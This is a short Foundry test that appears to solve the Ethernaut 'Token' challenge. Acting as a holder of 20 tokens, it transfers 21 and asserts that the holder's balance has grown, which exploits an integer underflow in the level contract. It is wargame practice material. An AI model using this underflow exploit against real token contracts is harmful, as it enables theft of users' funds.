// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Token} from "ethernaut/levels/Token.sol";

contract TokenTest is Test {
    Token public victimToken;
    address public alice = address(0x1000);
    address public bob = address(0x2000);

    function setUp() public {
        victimToken = new Token(21000000);

        victimToken.transfer(alice, 20);
    }

    function testAttack() external {
        vm.startPrank(alice);

        victimToken.transfer(bob, 21);

        assertTrue(victimToken.balanceOf(alice) > 20);
    }
}
